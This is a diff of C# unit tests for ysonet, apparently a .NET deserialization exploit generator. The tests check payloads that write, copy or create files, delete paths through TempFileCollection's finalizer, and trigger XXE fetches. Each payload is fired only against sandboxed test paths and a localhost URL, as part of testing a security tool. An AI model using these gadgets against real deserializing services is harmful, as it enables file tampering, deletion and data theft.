+                    "the equal-pair refusal explains the rule: " + equal.ErrorMessage);
+            }
+
+            // The write operation compares the target path against the EMBEDDED TEXT, so a
+            // content file whose text sorts above the target path is refused the same way.
+            string high = MakeTempFile("ysonet_fileops_high_content.txt", "zzzz sorts above any path");
+            try
+            {
+                RunResult r = GenerateFileOps(1, FileOpsPath("aa_target.txt") + ";" + high);
+                AssertTrue(!r.Success, "write refuses content that sorts above the target path");
+                AssertTrue((r.ErrorMessage ?? "").Contains("embedded text"),
+                    "the write refusal names the embedded text, not the file path: " + r.ErrorMessage);
+                AssertTrue((r.ErrorMessage ?? "").Contains("change the content")
+                    || (r.ErrorMessage ?? "").Contains("Change the target path"),
+                    "the write refusal suggests what to change: " + r.ErrorMessage);
+            }
+            finally { SafeDelete(high); }
+
+            // Variant 5 pairs the path with an internal "", which every non-empty string
+            // sorts after, so it only needs the normal non-empty check.
+            AssertTrue(GenerateFileOps(5, FileOpsPath("aa_empty_target.txt")).Success,
+                "the empty-file operation accepts a low-sorting target path");
+        }
+
+        // -c is split on the FIRST ';' only, both halves are preserved verbatim, and the
+        // single-field operation treats a ';' as part of the path.
+        private static void FileOperationsParseTheCommandStrictly()
+        {
+            foreach (int variant in new[] { 1, 2, 3, 4 })
+            {
+                RunResult noSep = GenerateFileOps(variant, FileOpsPath("zz_only.txt"));
+                AssertTrue(!noSep.Success, "variant " + variant + " needs the ';' separator");
+                AssertTrue((noSep.ErrorMessage ?? "").Contains(";"),
+                    "the message shows the ';' is missing: " + noSep.ErrorMessage);
+
+                AssertTrue(!GenerateFileOps(variant, ";" + FileOpsPath("aa.txt")).Success,
+                    "variant " + variant + " refuses an empty first field");
+                AssertTrue(!GenerateFileOps(variant, FileOpsPath("zz.txt") + ";").Success,
+                    "variant " + variant + " refuses an empty second field");
+            }
+
+            // Later semicolons and spaces belong to the second field.
+            string source = FileOpsPath("zz source.txt");
+            string dest = FileOpsPath("aa dest;with;semicolons.txt");
+            string text = FileOpsStreamText(2, source + ";" + dest, null);
+            AssertTrue(text.Contains(dest),
+                "everything after the first ';' is one destination path, spaces and all");
+            AssertTrue(text.Contains(source), "the source path is preserved verbatim");
+
+            // Variant 5 takes the whole value, so a ';' inside the path is unambiguous.
+            string odd = FileOpsPath("zz_weird;name.txt");
+            AssertTrue(FileOpsStreamText(5, odd, null).Contains(odd),
+                "the empty-file operation treats the whole -c value as the target path");
+            AssertTrue(!GenerateFileOps(5, "").Success, "the empty-file operation needs a path");
+        }
+
+        // The write operation reads its content on THIS machine while the payload is built.
+        // Proof: generate, delete the fixture, then deserialize and still get the exact text
+        // at the target. It also must never silently treat a missing file as inline text.
+        private static void FileOperationsWriteEmbedsTheLocalFileAtGenerationTime()
+        {
+            // Non-ASCII, plus a UTF-8 BOM on the fixture. File.ReadAllText consumes the BOM,
+            // and File.WriteAllText(string,string) writes UTF-8 with no BOM, so the transfer
+            // preserves CHARACTERS, not the source file's bytes.
+            // The non-ASCII characters are written as \u escapes so this source file itself
+            // stays pure ASCII and cannot be corrupted by a compiler codepage guess.
+            string body = FileOpsLowSortingText
+                + "\u00c4\u00d6\u00dc caf\u00e9 \u4f60\u597d\r\nlast line\r\n";
+            string fixture = TestArtifactPath("ysonet_fileops_bom_content.txt");
+            string target = FileOpsPath("zz_write_target.txt");
+            SafeDelete(fixture);
+            SafeDelete(target);
+            try
+            {
+                File.WriteAllText(fixture, body, new UTF8Encoding(true));
+                AssertTrue(File.Exists(fixture), "the BOM-bearing content fixture survived the write");
+                AssertTrue(File.ReadAllBytes(fixture)[0] == 0xEF, "the fixture really starts with a BOM");
+                AssertTrue(String.CompareOrdinal(target, body) > 0,
+                    "the fixture pair satisfies the ordinal rule without the generator changing it");
+
+                RunResult r = GenerateFileOps(1, target + ";" + fixture);
+                AssertTrue(r.Success, "the write payload generates: " + r.ErrorMessage);
+                byte[] payload = Bytes(r.Raw);
+
+                // Delete the source of the text: if anything were read at DESERIALIZE time
+                // instead, the next step could not reproduce it.
+                SafeDelete(fixture);
+                AssertTrue(!File.Exists(fixture), "the local content file is gone before firing");
+
+                RunSTA(delegate { DeserializeAs("bf", payload); });
+
+                AssertTrue(File.Exists(target), "the payload wrote the target file");
+                AssertEqual(body, File.ReadAllText(target),
+                    "the target holds exactly the decoded text of the deleted fixture");
+                byte[] written = File.ReadAllBytes(target);
+                AssertTrue(!(written.Length >= 3 && written[0] == 0xEF && written[1] == 0xBB && written[2] == 0xBF),
+                    "File.WriteAllText(string,string) writes UTF-8 with no BOM, so the BOM is not re-added");
+            }
+            finally { SafeDelete(fixture); SafeDelete(target); }
+
+            // A missing or unreadable content file is an error, never inline text.
+            RunResult missing = GenerateFileOps(1,
+                FileOpsPath("zz_target.txt") + ";" + FileOpsPath("no_such_content_file.txt"));
+            AssertTrue(!missing.Success, "a missing local content file fails generation");
+            AssertTrue((missing.ErrorMessage ?? "").Contains("LOCAL file"),
+                "the message says the second field is a local file: " + missing.ErrorMessage);
+            AssertTrue((missing.ErrorMessage ?? "").Contains("never inline text"),
+                "the message rules out the inline-text reading: " + missing.ErrorMessage);
+        }
+
+        // Both selectors reject anything outside their range instead of quietly falling
+        // back to a default, which would hide a typo behind a payload nobody asked for.
+        private static void FileOperationsOptionsAreValidated()
+        {
+            string ok = FileOpsPath("zz_a.txt") + ";" + FileOpsPath("aa_b.txt");
+
+            foreach (string bad in new[] { "nope", "0", "6", "-1", "" })
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = ok;
+                ia.Test = false;
+                ia.ExtraArguments = new List<string> { "--variant", bad };
+                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = FileOpsGadget,
+                    FormatterName = "BinaryFormatter",
+                    OutputFormat = "",
+                    InputArgs = ia,
+                });
+                AssertTrue(!r.Success, "--variant " + bad + " is rejected");
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("variant must be 1, 2, 3, 4, or 5",
+                        StringComparison.OrdinalIgnoreCase) >= 0,
+                    "--variant " + bad + " reports the allowed values: " + r.ErrorMessage);
+            }
+
+            foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = ok;
+                ia.Test = false;
+                ia.ExtraArguments = new List<string>
+                {
+                    "--variant", "2",
+                    "--" + TypeConfuseDelegateGenerator.RootContainerOptionName, bad,
+                };
+                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = FileOpsGadget,
+                    FormatterName = "BinaryFormatter",
+                    OutputFormat = "",
+                    InputArgs = ia,
+                });
+                AssertTrue(!r.Success, "--rootcontainer " + bad + " is rejected");
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("rootcontainer must be 1, 2, or 3",
+                        StringComparison.OrdinalIgnoreCase) >= 0,
+                    "--rootcontainer " + bad + " reports the allowed values: " + r.ErrorMessage);
+            }
+
+            for (int container = 1; container <= 3; container++)
+                AssertTrue(GenerateFileOps(2, ok, "BinaryFormatter", container, false).Success,
+                    "--rootcontainer " + container + " is accepted");
+        }
+
+        // The container swap changes the serialized ROOT and nothing else, exactly as it
+        // does for the command and XAML paths. Omitting the option must equal container 1.
+        private static void FileOperationsRootContainersSwapOnlyTheRoot()
+        {
+            const string sortedSet = "System.Collections.Generic.SortedSet`1";
+            const string treeSet = "System.Collections.Generic.TreeSet`1";
+            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";
+            string cmd = FileOpsPath("zz_c_source.txt") + ";" + FileOpsPath("aa_c_dest.txt");
+
+            AssertTrue(BytesEqual(Bytes(GenerateFileOps(2, cmd, "BinaryFormatter", null, false).Raw),
+                                  Bytes(GenerateFileOps(2, cmd, "BinaryFormatter", 1, false).Raw)),
+                "no --rootcontainer equals --rootcontainer 1 byte-for-byte");
+
+            string c1 = FileOpsStreamText(2, cmd, 1);
+            string c2 = FileOpsStreamText(2, cmd, 2);
+            string c3 = FileOpsStreamText(2, cmd, 3);
+
+            AssertTrue(c1.Contains(sortedSet), "container 1 serializes a SortedSet root");
+            AssertTrue(c2.Contains(sortedDict) && c2.Contains(treeSet) && !c2.Contains(sortedSet),
+                "container 2 serializes a SortedDictionary root with its TreeSet backing set and no SortedSet name");
+            AssertTrue(c3.Contains(treeSet) && !c3.Contains(sortedDict) && !c3.Contains(sortedSet),
+                "container 3 serializes a bare TreeSet root");
+
+            foreach (string text in new[] { c1, c2, c3 })
+            {
+                AssertTrue(text.Contains("CompareOrdinal"), "every container keeps the ordinal comparison");
+                AssertTrue(text.Contains("System.IO.File"), "every container keeps the file sink");
+            }
+        }
+
+        // Formatter-expansion result, locked instead of assumed. The candidate set is the
+        // four formatters GenericGenerator.Serialize can even produce; the public-member
+        // serializers cannot rebuild a MulticastDelegate invocation list at all. Of those
+        // four, SoapFormatter is impossible for the same reason it is for every container
+        // gadget: each root is a generic type and SoapFormatter cannot serialize one.
+        private static void FileOperationsCannotUseSoapFormatter()
+        {
+            AssertTrue(!Gadget(FileOpsGadget).IsSupported("SoapFormatter"),
+                "SoapFormatter is not advertised by " + FileOpsGadget);
+            foreach (string f in FileOpsFormatters)
+                AssertTrue(Gadget(FileOpsGadget).IsSupported(f), f + " is advertised");
+
+            string cmd = FileOpsPath("zz_soap_source.txt") + ";" + FileOpsPath("aa_soap_dest.txt");
+            for (int container = 1; container <= 3; container++)
+            {
+                var gen = new TypeConfuseDelegateFileOperationsGenerator();
+                gen.Options().Parse(new[]
+                {
+                    "--variant", "2",
+                    "--" + TypeConfuseDelegateGenerator.RootContainerOptionName, container.ToString(),
+                });
+                InputArgs ia = new InputArgs();
+                ia.Cmd = cmd;
+                ia.Test = false;
+                AssertThrows(delegate { gen.Generate("SoapFormatter", ia); },
+                    "SoapFormatter cannot serialize the generic root of container " + container);
+            }
+        }
+
+        // Both strings this gadget carries are user data the target uses literally, so
+        // --minify must never rewrite them. The XML minifier is not text preserving
+        // (XmlXSLTMinifier trims text nodes, the XmlDocument round trip drops a CR, and a
+        // dirty-match pass collapses "; "), so the gadget verifies the serialized payload
+        // and refuses instead of delivering a rewritten file.
+        //
+        // Each case below is measured, not assumed: the same input is fired through the
+        // BinaryFormatter (binary, carries the string verbatim) and asserted to arrive
+        // intact, so a refusal can never be blamed on the input itself.
+        private static void FileOperationsRefuseLossyMinification()
+        {
+            // What the XML minifier really rewrites, and what it leaves alone.
+            var lossy = new[] { "!a\r\nb", "!one line\n", "!one line\r\n", "!a; b; c" };
+            var safe = new[] { "!one line no newline", "!a\nb", "!a  b" };
+
+            foreach (string body in lossy)
+                AssertFileOpsMinifyVerdict(body, false);
+            foreach (string body in safe)
+                AssertFileOpsMinifyVerdict(body, true);
+
+            // The limitation belongs to the XML minifier, not to the gadget: the binary
+            // formatters minify the SAME lossy input and deliver it byte for byte.
+            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter" })
+                foreach (string body in lossy)
+                    AssertFileOpsWriteArrivesIntact(body, formatter, true);
+        }
+
+        // Assert whether a minified NetDataContractSerializer write payload is allowed for
+        // this content, and prove the same content is deliverable without --minify.
+        private static void AssertFileOpsMinifyVerdict(string body, bool expectAllowed)
+        {
+            string label = "content " + Preview(body);
+            string fixture = TestArtifactPath("ysonet_fileops_minify_probe.txt");
+            string target = FileOpsPath("zz_minify_probe.txt");
+            SafeDelete(fixture);
+            try
+            {
+                // Written directly rather than through WriteTestArtifact because the exact
+                // encoding is the point (UTF-8, no BOM). Verified straight away, so an
+                // antivirus deletion shows up as this message and not as a puzzling refusal.
+                File.WriteAllText(fixture, body, new UTF8Encoding(false));
+                AssertTrue(File.Exists(fixture), "the content fixture survived the write (" + label + ")");
+
+                RunResult minified = GenerateFileOps(1, target + ";" + fixture,
+                    "NetDataContractSerializer", null, true);
+
+                if (expectAllowed)
+                {
+                    AssertTrue(minified.Success,
+                        "minified NDCS is allowed for content the minifier leaves alone (" + label
+                        + "): " + minified.ErrorMessage);
+                }
+                else
+                {
+                    AssertTrue(!minified.Success,
+                        "minified NDCS is refused for content the minifier would rewrite (" + label + ")");
+                    AssertTrue((minified.ErrorMessage ?? "").Contains("cannot use --minify with NetDataContractSerializer"),
+                        "the refusal names the combination: " + minified.ErrorMessage);
+                    AssertTrue((minified.ErrorMessage ?? "").Contains("BinaryFormatter"),
+                        "the refusal offers the formatters that do carry it: " + minified.ErrorMessage);
+                }
+
+                // Either way the un-minified NDCS payload must still deliver it intact, so
+                // the refusal is about --minify and nothing else.
+                AssertFileOpsWriteArrives(body, fixture, target, "NetDataContractSerializer", false, label);
+            }
+            finally { SafeDelete(fixture); SafeDelete(target); }
+        }
+
+        private static void AssertFileOpsWriteArrivesIntact(string body, string formatter, bool minify)
+        {
+            string fixture = TestArtifactPath("ysonet_fileops_binary_probe.txt");
+            string target = FileOpsPath("zz_binary_probe.txt");
+            SafeDelete(fixture);
+            try
+            {
+                File.WriteAllText(fixture, body, new UTF8Encoding(false));
+                AssertTrue(File.Exists(fixture), "the content fixture survived the write");
+                AssertFileOpsWriteArrives(body, fixture, target, formatter, minify,
+                    formatter + (minify ? " --minify" : "") + " content " + Preview(body));
+            }
+            finally { SafeDelete(fixture); SafeDelete(target); }
+        }
+
+        private static void AssertFileOpsWriteArrives(string body, string fixture, string target,
+            string formatter, bool minify, string label)
+        {
+            SafeDelete(target);
+            RunResult r = GenerateFileOps(1, target + ";" + fixture, formatter, null, minify);
+            AssertTrue(r.Success, "the write payload generates (" + label + "): " + r.ErrorMessage);
+            RunSTA(delegate { DeserializeAs(FileOpsDeserTag(formatter), Bytes(r.Raw)); });
+            AssertTrue(File.Exists(target), "the payload wrote the target file (" + label + ")");
+            AssertEqual(body, File.ReadAllText(target),
+                "the delivered text is byte-for-byte what the operator supplied (" + label + ")");
+            SafeDelete(target);
+        }
+
+        // A readable one-line form of a content fixture for an assertion message.
+        private static string Preview(string value)
+        {
+            string s = (value ?? "").Replace("\r", "\\r").Replace("\n", "\\n");
+            return "\"" + (s.Length <= 40 ? s : s.Substring(0, 40) + "...") + "\"";
+        }
+
+        // A target path is resolved by the DESERIALIZING process, not by ysonet. Proven with
+        // a child ysonet.exe whose working directory the test controls, so the runner's own
+        // process-wide current directory is never touched.
+        private static void FileOperationsTargetPathsAreRelativeToTheTarget()
+        {
+            string exeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
+            string exe = Path.Combine(exeDir, "ysonet.exe");
+            AssertTrue(File.Exists(exe), "ysonet.exe sits next to the test exe: " + exe);
+
+            string workDir = TestArtifactPath("ysonet_fileops_workdir");
+            SafeDeleteDir(workDir);
+            Directory.CreateDirectory(workDir);
+            try
+            {
+                const string relative = "zz_relative_target.txt";
+                var psi = new System.Diagnostics.ProcessStartInfo(exe);
+                psi.Arguments = "-g " + FileOpsGadget + " -f BinaryFormatter --variant 5 -c \""
+                    + relative + "\" -t -o base64";
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+                psi.WorkingDirectory = workDir;   // the only thing that decides where it lands
+
+                using (var proc = System.Diagnostics.Process.Start(psi))
+                {
+                    proc.OutputDataReceived += delegate { };
+                    proc.ErrorDataReceived += delegate { };
+                    proc.BeginOutputReadLine();
+                    proc.BeginErrorReadLine();
+                    if (!proc.WaitForExit(60000)) { try { proc.Kill(); } catch { } }
+                }
+
+                AssertTrue(File.Exists(Path.Combine(workDir, relative)),
+                    "the relative target path resolved against the DESERIALIZING process's working directory");
+                AssertTrue(!File.Exists(Path.Combine(exeDir, relative)),
+                    "nothing was written next to ysonet.exe");
+            }
+            finally { SafeDeleteDir(workDir); }
+        }
+
+        // The interactive editor must offer all five operation labels plus the root
+        // container as a separate plain option, start on the write default, and emit the
+        // NUMBER on the command line rather than the human label.
+        private static void EditorExposesTheFileOperationVariants()
+        {
+            var ed = new ModuleEditor(null, null, true, null, null);
+            var fields = ed.BuildFieldsForTest(FileOpsGadget);
+
+            EditableField variant = FindEditable(fields, "variant");
+            AssertTrue(variant != null, "the variant field is offered");
+            var declared = Gadget(FileOpsGadget).Variants();
+            AssertEqual(5, declared.Count, "five operations are declared");
+            AssertTrue(variant.Choices != null && variant.Choices.Count == 5,
+                "all five operation labels are offered");
+            for (int i = 0; i < declared.Count; i++)
+                AssertEqual(declared[i].Label, variant.Choices[i], "label " + (i + 1) + " is in variant order");
+            AssertEqual(declared[0].Label, variant.Value, "the editor starts on the write default");
+
+            EditableField container = FindEditable(fields,
+                TypeConfuseDelegateGenerator.RootContainerOptionName);
+            AssertTrue(container != null && !container.Hidden,
+                "the root container is a plain option, offered for every operation");
+
+            FindEditable(fields, "command").Value = FileOpsPath("zz_a.txt") + ";" + FileOpsPath("aa_b.txt");
+            string flag = VariantFlagFor(Gadget(FileOpsGadget));
+
+            variant.Value = declared[4].Label;   // the empty-file operation
+            string line = ed.GadgetCommandLineForTest();
+            AssertTrue(line.Contains(flag + " 5"), "the echoed command line carries the number: " + line);
+            AssertTrue(!line.Contains(declared[4].Label),
+                "the human label never leaks into the command line: " + line);
+        }
+
+        // ---- TempFileCollection (deferred target file delete) -------------------
+        //
+        // System.CodeDom.Compiler.TempFileCollection is field-serialized and its
+        // finalizer/Dispose calls File.Delete over a private Hashtable of paths. The gadget
+        // emits it through an ISerializable marshal and never builds a live one, so the tests
+        // below check the WIRE shape and the parsing here; the real deletion is proven in the
+        // FULL tier by FireTempFileCollectionDeletes.
+        //
+        // Every path any test here puts into a payload is either nonexistent or inside the
+        // test's own artifact directory, and every deserialize suppresses the finalizer it
+        // just armed. Nothing outside the test tree can ever be named.
+
+        private const string TempFilesGadget = "TempFileCollection";
+
+        private static readonly string[] TempFilesFormatters =
+        {
+            "BinaryFormatter", "SoapFormatter", "LosFormatter",
+            "NetDataContractSerializer", "DataContractSerializer",
+        };
+
+        // The XML formatters among them: the only ones whose --minify pass can rewrite a path.
+        private static readonly string[] TempFilesXmlFormatters =
+            { "SoapFormatter", "NetDataContractSerializer", "DataContractSerializer" };
+
+        // The deserializer tag for each of them (same tags DeserializeAs uses).
+        private static string TempFilesDeserTag(string formatter)
+        {
+            switch (formatter)
+            {
+                case "BinaryFormatter": return "bf";
+                case "SoapFormatter": return "soap";
+                case "LosFormatter": return "los";
+                case "NetDataContractSerializer": return "ndc";
+                case "DataContractSerializer": return "dcs";
+                default: throw new Exception("no deserializer tag for " + formatter);
+            }
+        }
+
+        private static RunResult GenerateTempFiles(string formatter, bool minify,
+            bool test, params string[] paths)
+        {
+            AssertTrue(paths != null && paths.Length > 0, "the test supplied at least one path");
+            InputArgs ia = new InputArgs();
+            ia.Cmd = paths[0];
+            ia.Test = test;
+            ia.Minify = minify;
+            var extra = new List<string>();
+            for (int i = 1; i < paths.Length; i++)
+            {
+                extra.Add("--" + TempFileCollectionGenerator.ExtraFileOptionName);
+                extra.Add(paths[i]);
+            }
+            ia.ExtraArguments = extra;
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = TempFilesGadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        private static RunResult GenerateTempFiles(params string[] paths)
+        {
+            return GenerateTempFiles("BinaryFormatter", false, false, paths);
+        }
+
+        // Deserialize a TempFileCollection payload and hand the real object to the caller,
+        // ALWAYS suppressing its finalizer afterwards. That is what makes it safe to
+        // reconstruct the type inside the test runner: the object is inspected and then
+        // disarmed, so nothing is left on the finalizer queue to delete a path later.
+        private static void WithDeserializedTempFileCollection(string formatter, object raw,
+            Action<object> inspect)
+        {
+            object obj = null;
+            try
+            {
+                obj = DeserializeTempFileCollection(formatter, raw);
+                inspect(obj);
+            }
+            finally
+            {
+                if (obj != null) GC.SuppressFinalize(obj);
+            }
+        }
+
+        // The path -> keepFile map the target's Delete() reads, pulled off a deserialized
+        // instance by reflection. Ordinal keys, because the framework's own lookup uses the
+        // exact string it copied out of the table.
+        private static Dictionary<string, object> TempFilesTableOf(object collection)
+        {
+            var field = collection.GetType().GetField("files",
+                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
+            AssertTrue(field != null, "TempFileCollection still has its private 'files' field");
+            var table = field.GetValue(collection) as System.Collections.Hashtable;
+            AssertTrue(table != null, "the 'files' field carries a Hashtable");
+            var map = new Dictionary<string, object>(StringComparer.Ordinal);
+            foreach (System.Collections.DictionaryEntry e in table)
+                map[(string)e.Key] = e.Value;
+            return map;
+        }
+
+        private static object TempFilesFieldOf(object collection, string name)
+        {
+            var field = collection.GetType().GetField(name,
+                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
+            AssertTrue(field != null, "TempFileCollection still has its private '" + name + "' field");
+            return field.GetValue(collection);
+        }
+
+        // Every advertised formatter, raw and minified, must rebuild the REAL framework type
+        // with exactly the four fields the target's Delete() path reads. A wire shape that
+        // merely generates proves nothing: if a field name drifts or a value arrives as true,
+        // the payload silently deletes nothing.
+        private static void TempFileCollectionCarriesTheRealTypeAndFields()
+        {
+            // Deliberately nonexistent, and named so a stray delete would be obvious.
+            string first = TestArtifactPath("ysonet_tfc_never_exists_1.txt");
+            string second = TestArtifactPath("ysonet_tfc_never_exists_2.txt");
+            AssertTrue(!File.Exists(first) && !File.Exists(second),
+                "the round-trip paths do not exist, so even a leaked finalizer has nothing to delete");
+
+            Type real = Type.GetType(TempFileCollectionGenerator.TempFileCollectionTypeName, true);
+
+            foreach (string formatter in TempFilesFormatters)
+            {
+                foreach (bool minify in new[] { false, true })
+                {
+                    string label = formatter + (minify ? " --minify" : "");
+                    RunResult r = GenerateTempFiles(formatter, minify, false, first, second);
+                    AssertTrue(r.Success, label + " generates: " + r.ErrorMessage);
+
+                    WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
+                    {
+                        AssertTrue(obj != null, label + " deserializes to an object");
+                        AssertEqual(real, obj.GetType(),
+                            label + " rebuilds the real System.CodeDom.Compiler.TempFileCollection");
+
+                        AssertTrue(TempFilesFieldOf(obj, "basePath") == null, label + ": basePath is null");
+                        AssertTrue(TempFilesFieldOf(obj, "tempDir") == null, label + ": tempDir is null");
+                        AssertEqual(false, TempFilesFieldOf(obj, "keepFiles"), label + ": keepFiles is false");
+
+                        var table = TempFilesTableOf(obj);
+                        AssertEqual(2, table.Count, label + ": both paths arrived");
+                        foreach (string path in new[] { first, second })
+                        {
+                            AssertTrue(table.ContainsKey(path), label + ": the path arrived verbatim (" + path + ")");
+                            AssertEqual(false, table[path],
+                                label + ": the per-file keepFile flag is false, so Delete() removes it");
+                        }
+                    });
+                }
+            }
+        }
+
+        // -c plus every repeated --extrafile, in order, with case-insensitive duplicates
+        // collapsed and empty values refused. Also: no path I/O at generation time - a path
+        // that happens to EXIST on this machine is still carried as the path, never read.
+        private static void TempFileCollectionOptionParsing()
+        {
+            // Repeatable option, order preserved.
+            RunResult many = GenerateTempFiles(@"C:\ysonet\a.txt", @"C:\ysonet\b.txt", @"C:\ysonet\c.txt");
+            AssertTrue(many.Success, "three paths generate: " + many.ErrorMessage);
+            WithDeserializedTempFileCollection("BinaryFormatter", many.Raw, delegate (object obj)
+            {
+                var table = TempFilesTableOf(obj);
+                AssertEqual(3, table.Count, "-c plus two --extrafile values give three entries");
+                foreach (string p in new[] { @"C:\ysonet\a.txt", @"C:\ysonet\b.txt", @"C:\ysonet\c.txt" })
+                    AssertTrue(table.ContainsKey(p), "entry present: " + p);
+            });
+
+            // Case-insensitive duplicates collapse to one entry. A Hashtable cannot hold two
+            // equal keys, and the real AddFile throws on a duplicate, so collapsing is the
+            // only reading of "delete it twice" that makes sense.
+            RunResult dupes = GenerateTempFiles(@"C:\ysonet\Dup.txt", @"C:\YSONET\dup.TXT", @"C:\ysonet\other.txt");
+            AssertTrue(dupes.Success, "a case-different duplicate is accepted: " + dupes.ErrorMessage);
+            WithDeserializedTempFileCollection("BinaryFormatter", dupes.Raw, delegate (object obj)
+            {
+                var table = TempFilesTableOf(obj);
+                AssertEqual(2, table.Count, "the case-different duplicate collapsed into one entry");
+                AssertTrue(table.ContainsKey(@"C:\ysonet\Dup.txt"),
+                    "the FIRST spelling is the one that is kept");
+                AssertTrue(table.ContainsKey(@"C:\ysonet\other.txt"), "the distinct path survived");
+            });
+
+            // An exact duplicate is equally harmless.
+            RunResult exact = GenerateTempFiles(@"C:\ysonet\same.txt", @"C:\ysonet\same.txt");
+            AssertTrue(exact.Success, "an exact duplicate is accepted: " + exact.ErrorMessage);
+            WithDeserializedTempFileCollection("BinaryFormatter", exact.Raw, delegate (object obj)
+            {
+                AssertEqual(1, TempFilesTableOf(obj).Count, "an exact duplicate collapsed too");
+            });
+
+            // Empty / whitespace-only inputs are refused, not silently dropped.
+            foreach (string bad in new[] { "", " ", "\t" })
+            {
+                RunResult noCmd = GenerateTempFiles("BinaryFormatter", false, false, bad);
+                AssertTrue(!noCmd.Success, "an empty -c is refused (" + Preview(bad) + ")");
+                AssertTrue((noCmd.ErrorMessage ?? "").Contains("-c"),
+                    "the refusal names -c: " + noCmd.ErrorMessage);
+
+                RunResult badExtra = GenerateTempFiles("BinaryFormatter", false, false, @"C:\ysonet\a.txt", bad);
+                AssertTrue(!badExtra.Success, "an empty --extrafile is refused (" + Preview(bad) + ")");
+                AssertTrue((badExtra.ErrorMessage ?? "").Contains(
+                    TempFileCollectionGenerator.ExtraFileOptionName),
+                    "the refusal names the option: " + badExtra.ErrorMessage);
+            }
+
+            // Escaping is the serializer's job, not a hand-built template's: a path full of
+            // XML and JSON metacharacters must survive every advertised formatter unchanged.
+            const string nasty = @"C:\ysonet\<a>&""'quote--;\x.txt";
+            foreach (string formatter in TempFilesFormatters)
+            {
+                RunResult r = GenerateTempFiles(formatter, false, false, nasty);
+                AssertTrue(r.Success, formatter + " generates a metacharacter path: " + r.ErrorMessage);
+                WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
+                {
+                    AssertTrue(TempFilesTableOf(obj).ContainsKey(nasty),
+                        formatter + " carried the metacharacter path verbatim");
+                });
+            }
+
+            // No path I/O here: a file that EXISTS on this machine is still just a path. (The
+            // shell-command gadgets read -c from a file when one exists; this one must not.)
+            string existing = WriteTestArtifact("ysonet_tfc_existing_input.txt", "this text must never be read");
+            try
+            {
+                RunResult r = GenerateTempFiles(existing);
+                AssertTrue(r.Success, "an existing local path generates: " + r.ErrorMessage);
+                WithDeserializedTempFileCollection("BinaryFormatter", r.Raw, delegate (object obj)
+                {
+                    var table = TempFilesTableOf(obj);
+                    AssertEqual(1, table.Count, "one entry");
+                    AssertTrue(table.ContainsKey(existing),
+                        "an existing local path is carried as the PATH, not replaced by its contents");
+                });
+                AssertTrue(File.Exists(existing), "generation did not delete or move the local file");
+                AssertEqual("this text must never be read", File.ReadAllText(existing),
+                    "generation did not touch the local file's contents");
+            }
+            finally { SafeDelete(existing); }
+        }
+
+        // The interactive info panel only renders BodyRows lines, so a long
+        // AdditionalInfo() silently pushes "Formatters:", "Command input:" and the category
+        // summary off the visible area with no error anywhere. The shared canary
+        // (ModuleInfoPanelShowsFacts) only guards the FIRST gadget alphabetically, so this
+        // gadget checks its own panel - its AdditionalInfo has real preconditions to state
+        // and is the kind of text that grows.
+        private static void TempFileCollectionInfoPanelStillShowsItsFacts()
+        {
+            var ed = new ModuleEditor(null, null, true, null, null);
+            // A pessimistically NARROW info column: the panel is one of four columns, so a
+            // realistic terminal gives it more room than this.
+            string[] lines = ed.ModuleInfoLinesForTest(TempFilesGadget, 34);
+            int visible = ModuleEditor.BodyRowsForTest;
+            AssertTrue(lines.Length > 0, "the info panel renders for " + TempFilesGadget);
+
+            // The panel uses the COMPACT category form, so the summary is one
+            // "Categories: ..." line rather than the detailed per-axis block.
+            foreach (string fact in new[] { "Formatters:", "Command input:", "Categories" })
+            {
+                int at = -1;
+                for (int i = 0; i < lines.Length; i++)
+                    // The category summary lines carry their own indentation.
+                    if (lines[i].TrimStart().StartsWith(fact, StringComparison.Ordinal)) { at = i; break; }
+                AssertTrue(at >= 0, "the panel states " + fact);
+                AssertTrue(at < visible, fact + " is still on screen (row " + at + " of "
+                    + visible + " visible; shorten AdditionalInfo() and move the detail into "
+                    + "the option help)");
+            }
+
+            // The repeatable extra-path option must reach the editor too, so the gadget is
+            // fully usable from the interactive build and not only from the command line.
+            EditableField extra = FindEditable(ed.BuildFieldsForTest(TempFilesGadget),
+                TempFileCollectionGenerator.ExtraFileOptionName);
+            AssertTrue(extra != null && !extra.Hidden,
+                "the editor offers the " + TempFileCollectionGenerator.ExtraFileOptionName + " setting");
+            AssertTrue(!string.IsNullOrEmpty(extra.Help),
+                "the extra-path setting carries its help text into the editor");
+        }
+
+        // A UNC path and a relative path both reach the target verbatim. Nothing is
+        // canonicalized, rooted against ysonet's working directory, or expanded here - which
+        // is the whole difference between a target path and a local file path.
+        // ---- DataViewManagerXxe ------------------------------------------------
+
+        private static readonly string[] DvmXxeFormatters =
+        {
+            "Xaml", "JavaScriptSerializer", "FastJson", "SharpSerializerXml", "SharpSerializerBinary"
+        };
+
+        private const string DvmXxeUrl = "http://127.0.0.1:1/ysonet-test.dtd";
+
+        private static RunResult GenerateDvmXxe(string formatter, bool minify, string url)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = url;
+            ia.Minify = minify;
+            ia.Test = false;
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "DataViewManagerXxe",
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        private static string DvmXxePayloadText(object raw)
+        {
+            string text = raw as string;
+            if (text != null) return text;
+            byte[] bytes = raw as byte[];
+            // The binary formatter's stream still carries the XML and the type name as
+            // plain UTF-8 string records, so a text search is valid evidence there too.
